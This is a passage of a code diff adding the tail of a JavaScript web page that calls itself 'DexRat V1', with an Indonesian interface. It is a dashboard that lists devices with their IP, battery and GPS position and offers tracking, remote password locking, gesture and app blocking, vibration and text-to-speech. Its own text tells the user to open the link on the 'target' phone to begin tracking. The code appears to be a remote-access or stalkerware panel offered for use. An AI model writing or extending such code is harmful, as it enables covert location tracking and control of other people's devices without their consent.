+function ctrlShake() {
+  document.body.classList.add('shake-anim');
+  setTimeout(function() { document.body.classList.remove('shake-anim'); }, 800);
+  if (navigator.vibrate) navigator.vibrate([100,50,100,50,100,50,100]);
+}
+
+function ensureAudioCtx() {
+  if (!audioCtx) {
+    const Ctx = window.AudioContext || window.webkitAudioContext;
+    if (!Ctx) return null;
+    audioCtx = new Ctx();
+  }
+  if (audioCtx.state === 'suspended') audioCtx.resume().catch(function(){});
+  return audioCtx;
+}
+
+function beep(freq, start, dur, ctx, vol) {
+  const osc = ctx.createOscillator();
+  const gain = ctx.createGain();
+  osc.type = 'square';
+  osc.frequency.value = freq;
+  gain.gain.setValueAtTime(0.0001, start);
+  gain.gain.exponentialRampToValueAtTime(vol || 0.5, start + 0.02);
+  gain.gain.exponentialRampToValueAtTime(0.0001, start + dur);
+  osc.connect(gain).connect(ctx.destination);
+  osc.start(start);
+  osc.stop(start + dur + 0.05);
+}
+
+// ============================================================
+// LOCK FUNCTIONS
+// ============================================================
+function applyLock(pw) {
+  lockPassword = pw; isLocked = true;
+  showToast('Device terkunci!', 'warning');
+}
+
+function forceUnlock() {
+  isLocked = false; lockPassword = null;
+  showToast('Dibuka', 'success');
+}
+
+// ============================================================
+// GESTURE BLOCK
+// ============================================================
+function blockGesture(seconds) {
+  const sec = parseInt(seconds);
+  if (!sec || sec < 1) { showToast('Durasi minimal 1 detik', 'warning'); return; }
+  gestureBlockDuration = sec * 1000;
+  gestureBlockEndTime = Date.now() + gestureBlockDuration;
+  if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+  if (gestureBlockTimer) clearTimeout(gestureBlockTimer);
+  gestureBlockTimer = setTimeout(function() { stopGestureBlock(); }, gestureBlockDuration);
+  showToast('Gestur diblokir selama ' + sec + ' detik', 'warning');
+}
+
+function stopGestureBlock() {
+  if (gestureBlockTimer) { clearTimeout(gestureBlockTimer); gestureBlockTimer = null; }
+  gestureBlockEndTime = 0;
+  gestureBlockDuration = 0;
+  showToast('Block gestur selesai', 'success');
+}
+
+// ============================================================
+// APP BLOCK
+// ============================================================
+function addBlockedApp(appName) {
+  const name = String(appName || '').trim().toLowerCase();
+  if (!name) { showToast('Nama aplikasi tidak boleh kosong', 'warning'); return; }
+  if (blockedApps.indexOf(name) !== -1) {
+    showToast('Aplikasi "' + name + '" sudah diblokir', 'info');
+    return;
+  }
+  blockedApps.push(name);
+  showToast('Aplikasi "' + name + '" diblokir', 'warning');
+  if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+}
+
+function removeBlockedApp(appName) {
+  const name = String(appName || '').trim().toLowerCase();
+  const idx = blockedApps.indexOf(name);
+  if (idx > -1) {
+    blockedApps.splice(idx, 1);
+    showToast('Aplikasi "' + name + '" di-unblock', 'success');
+  } else {
+    showToast('Aplikasi tidak ditemukan', 'warning');
+  }
+}
+
+function clearAllBlockedApps() {
+  blockedApps = [];
+  showToast('Semua blokir aplikasi dihapus', 'info');
+}
+
+function startAppBlockWatcher() {
+  if (appBlockWatcher) clearInterval(appBlockWatcher);
+  appBlockWatcher = setInterval(function() {}, 1000);
+}
+
+function openAppBlockListModal(targetId) {
+  appBlockListTargetId = targetId;
+  const isSelf = targetId === myDeviceId;
+  const titleEl = document.getElementById('appBlockListTitle');
+  if (titleEl) titleEl.textContent = 'Aplikasi Diblokir - ' + (isSelf ? 'Anda' : (devices[targetId] ? devices[targetId].name : 'Unknown'));
+}
+
+function closeAppBlockListModal() {
+  appBlockListTargetId = null;
+}
+
+// ============================================================
+// UTILITIES
+// ============================================================
+function cleanupDevices() {
+  const now = Date.now();
+  Object.keys(devices).forEach(function(id) {
+    if ((now - devices[id].lastSeen) > 300000 && id !== myDeviceId) delete devices[id];
+  });
+  renderDeviceList();
+  updateNavDeviceBadge();
+}
+
+function speakText(text) {
+  if (!('speechSynthesis' in window)) { showToast('TTS tidak didukung', 'error'); return; }
+  window.speechSynthesis.cancel();
+  const u = new SpeechSynthesisUtterance(text);
+  u.lang = 'id-ID';
+  window.speechSynthesis.speak(u);
+}
+
+function formatTimeAgo(ts) {
+  const diff = Math.floor((Date.now() - ts) / 1000);
+  if (diff < 5) return 'Baru saja';
+  if (diff < 60) return diff + 'd lalu';
+  if (diff < 3600) return Math.floor(diff / 60) + 'm lalu';
+  if (diff < 86400) return Math.floor(diff / 3600) + 'j lalu';
+  return Math.floor(diff / 86400) + 'h lalu';
+}
+
+function escapeHtml(str) {
+  if (!str) return '';
+  return String(str).replace(/[&<>"']/g, function(m) {
+    return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[m];
+  });
+}
+
+// ============================================================
+// RENDER DEVICE LIST
+// ============================================================
+function renderDeviceList() {
+  const list = document.getElementById('deviceList');
+  if (!list) return;
+  const now = Date.now();
+  const arr = Object.keys(devices).map(function(k) { return devices[k]; });
+  arr.sort(function(a, b) { return b.lastSeen - a.lastSeen; });
+  const total = arr.length;
+  const online = arr.filter(function(d) { return (now - d.lastSeen) < DEVICE_TIMEOUT; }).length;
+  const offline = total - online;
+  document.getElementById('statTotal').textContent = total;
+  document.getElementById('statOnline').textContent = online;
+  document.getElementById('statOffline').textContent = offline;
+
+  // Default: kosong
+  if (arr.length === 0) {
+    list.innerHTML = '<div class="empty-state">' +
+      '<div class="empty-icon"><i class="fas fa-satellite"></i></div>' +
+      '<div class="empty-title">Belum Ada Perangkat</div>' +
+      '<div class="empty-desc">Belum ada perangkat yang terhubung. Buka link ini di HP target untuk mulai tracking.</div>' +
+      '</div>';
+    return;
+  }
+
+  list.innerHTML = arr.map(function(d) {
+    const isOnline = (now - d.lastSeen) < DEVICE_TIMEOUT;
+    const isSelf = d.deviceId === myDeviceId;
+    const statusText = isOnline ? 'ONLINE' : 'OFFLINE';
+    const statusClass = isOnline ? 'online' : 'offline';
+    const battery = (d.battery !== null && d.battery !== undefined) ? d.battery + '%' : '-';
+    const hasLocation = d.lat !== null && d.lng !== null && d.lat !== undefined && d.lng !== undefined;
+    const locationStatus = hasLocation ? (d.lat.toFixed(3) + ', ' + d.lng.toFixed(3)) : 'Belum ada GPS';
+    const lockedBadge = d.isLocked ? ' <span style="color: #000; font-weight: 900;">[LOCKED]</span>' : '';
+    return '<div class="device-card ' + (isOnline ? '' : 'offline') + '" data-id="' + d.deviceId + '">' +
+      '<div class="device-card-head">' +
+        '<div class="device-icon-box ' + (isSelf ? 'you' : '') + '"><i class="fas fa-' + (isSelf ? 'user-check' : 'mobile-alt') + '"></i></div>' +
+        '<div class="device-meta-main">' +
+          '<div class="name">' + escapeHtml(d.name) + (isSelf ? ' (Anda)' : '') + lockedBadge + '</div>' +
+          '<div class="sub">' + escapeHtml(d.os) + '</div>' +
+        '</div>' +
+        '<div class="device-status-pill ' + statusClass + '"><span class="pdot"></span>' + statusText + '</div>' +
+      '</div>' +
+      '<div class="device-card-info">' +
+        '<div class="device-info-item"><div class="lbl"><i class="fas fa-network-wired"></i> IP</div><div class="val">' + escapeHtml(d.ip) + '</div></div>' +
+        '<div class="device-info-item"><div class="lbl"><i class="fas fa-battery-half"></i> Baterai</div><div class="val">' + battery + '</div></div>' +
+      '</div>' +
+      '<div class="device-card-foot">' +
+        '<span><i class="fas fa-map-pin"></i> ' + locationStatus + '</span>' +
+        '<span class="open-btn"><i class="fas fa-location-dot"></i> Track</span>' +
+      '</div>' +
+    '</div>';
+  }).join('');
+}
+
+// ============================================================
+// REFRESH FAB
+// ============================================================
+document.getElementById('refreshFab').addEventListener('click', function() {
+  publishAnnounce();
+  renderDeviceList();
+  updateNavDeviceBadge();
+  showToast('Refreshed', 'info');
+});
+
+// Cleanup
+window.addEventListener('beforeunload', function() {
+  if (announceInterval) clearInterval(announceInterval);
+  if (cleanupInterval) clearInterval(cleanupInterval);
+  if (mqttClient) mqttClient.end();
+  if (gestureBlockInterval) clearInterval(gestureBlockInterval);
+  if (gestureBlockTimer) clearTimeout(gestureBlockTimer);
+  if (appBlockWatcher) clearInterval(appBlockWatcher);
+  if ('speechSynthesis' in window) window.speechSynthesis.cancel();
+});
+
+console.log('DexRat V1 — Login + Home + Direct Dashboard (No Loading, No Permissions)');
+</script>
+</body>
+</html>
